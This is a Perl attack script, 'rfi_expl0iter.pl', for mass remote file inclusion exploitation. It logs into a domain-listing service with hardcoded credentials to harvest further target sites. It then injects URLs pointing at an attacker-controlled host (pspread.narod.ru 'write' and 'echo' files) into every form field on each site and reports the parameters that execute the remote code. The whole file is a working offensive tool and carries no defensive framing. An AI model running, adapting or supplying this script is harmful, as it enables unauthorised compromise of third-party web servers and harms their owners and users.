#!perl -w

use LWP::UserAgent;
use Getopt::Std;
use HTML::Form;

$|=1;
print "\n# $0\n# (C)oded by .:[KSURi]:.\n\n";

my %opts;
getopts("t:ed",\%opts);
usage() unless defined $opts{t};

my $ddb="http://domainsdb.net/";
my $ddbLogin="KSURi";
my $ddbPassword="xaos";
my $evilHost="http://pspread.narod.ru/";
my @exploits=($evilHost."write",
              $evilHost."write.txt",
              $evilHost."write.php");
my @echoes=($evilHost."echo",
            $evilHost."echo.txt",
            $evilHost."echo.php");

if(exists $opts{d}) { foreach(ddbExtractTargets(ddbGetCookies(),$opts{t})) { checkRFI($_) } }
else { checkRFI($opts{t}) }

sub ddbGetCookies
{
  my $ua=LWP::UserAgent->new(timeout=>7,
                             cookie_jar=>{});
  my $response=$ua->post($ddb."cgi-bin/login.cgi",
                         [user=>$ddbLogin,
                          pass=>$ddbPassword,
                          action=>"login",
                          "1action"=>"GetByDomain",
                          domain=>"...."],
                         Referer=>$ddb."cgi-bin/login.cgi");
  $response->is_success||die "Ddb login failed";
  return $ua->cookie_jar;
}

sub ddbExtractTargets
{
  my $ua=LWP::UserAgent->new(timeout=>7,
                             cookie_jar=>shift);
  my $response=$ua->get($ddb.shift,
                        Referer=>$ddb);
  $response->is_success||die "Ddb request failed";
  foreach(split("\n",$response->content))
  {
    if(/<b>there are <a href=\"(.+?)\">\d+ domains<\/a>/)
    {
      $response=$ua->get($ddb.$1,
                         Referer=>$ddb);
      $response->is_success||die "Ddb request failed";
      my @results=();
      foreach(split("\n",$response->content)) { push(@results,$1) if /<b><a href=\"(.+?)\" class=text12 target=_blank>/ }
      return @results;
    }
  }
}

sub checkRFI
{
  my $target=shift;
  $target="http://".$target if $target!~/^http:\/\//;
  my $ua=LWP::UserAgent->new;
  #$ua->proxy("http","your proxy here");
  my $response=$ua->get($target);
  $response->is_success||return;
  my @forms=HTML::Form->parse($response,
                              $response->base);
  #die "No forms found" if scalar @forms<1;
  foreach my $form(@forms)
  {
    foreach my $input($form->inputs)
    {
      #next if $input->readonly;
      #$input->type eq "text"||next;
      my @payloads;
      exists $opts{e}?(@payloads=@exploits):(@payloads=@echoes);
      foreach my $payload(@payloads)
      {
        $form->value($input->name,$payload);
        $response=$ua->request($form->click);
        do
        {
          print "\n[+] Exploitable RFI found";
          print "\n[i] Script: ".$form->action;
          print "\n[i] Method: ".$form->method;
          print "\n[i] Param: ".$input->name," Type: ".$input->type;
          print "\n[i] Payload: ".$payload."\n\n";
          return;
        } if $response->content=~/!!!EXPLOITED!!!|!!!RFI FOUND!!!/m;
      }
    }
  }
}

sub usage
{
  print qq{
Usage: perl $0 -options
-t\ttarget host
-e\tdecide whether or not to exploit bugs [optional]
-d\tuse domainsdb to search more targets  [optional]
Example: perl $0 -t sex.com -e -d
  };
  exit 0;
}

# rfi_expl0iter.pl
# (C)oded by .:[KSURi]:. 